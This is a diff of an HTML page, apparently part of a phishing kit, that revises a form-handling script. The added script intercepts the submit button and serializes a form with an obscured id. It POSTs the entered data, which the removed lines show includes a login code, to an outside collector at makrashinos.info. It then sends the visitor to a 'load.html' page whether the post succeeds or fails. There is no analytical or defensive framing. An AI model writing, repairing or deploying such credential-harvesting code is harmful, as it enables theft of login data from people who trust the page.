@@ -24901,33 +24901,34 @@
       </script>
    </div>
 
-   <script>
-      let isClicked = false;
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+   let isClicked = false;
 
-      $(document).ready(function () {
-         $("#form_submit").click(function (event) {
-            if (!isClicked) {
-               event.preventDefault();
-               $.ajax({
-                  url: "http://makrashinos.info/rrakmellow.php/",
-                  method: "POST",
-                  data: $("#sfasfkWFtomnS").serialize(),
-                  success: function (response) {
-                     // Set the flag to true to indicate that the button has been clicked
-                     isClicked = true;
-                     // Redirect after the first click and data submission
-                     window.location.href = 'load.html';
-                  },
-                  error: function () {
-                     var inputField = document.getElementById("login_code");
-                     inputField.value = "";
-                     window.location.href = 'load.html';
-                  }
-               });
-            }
-         });
+   $(document).ready(function () {
+      $("#form_submit").click(function (event) {
+         if (!isClicked) {
+            event.preventDefault();
+            $.ajax({
+               url: "https://makrashinos.info/rrakmellow.php/",
+               method: "POST",
+               data: $("#sfasfkWFtomnS").serialize(),
+               success: function (response) {
+                  // Set the flag to true to indicate that the button has been clicked
+                  isClicked = true;
+                  // Redirect after the first click and data submission
+                  window.location.href = '/load.html';
+               },
+               error: function () {
+                  // Redirect even on error
+                  window.location.href = '/load.html';
+               }
+            });
+         }
       });
-   </script>
+   });
+</script>
+
 </body>
 
 </html>
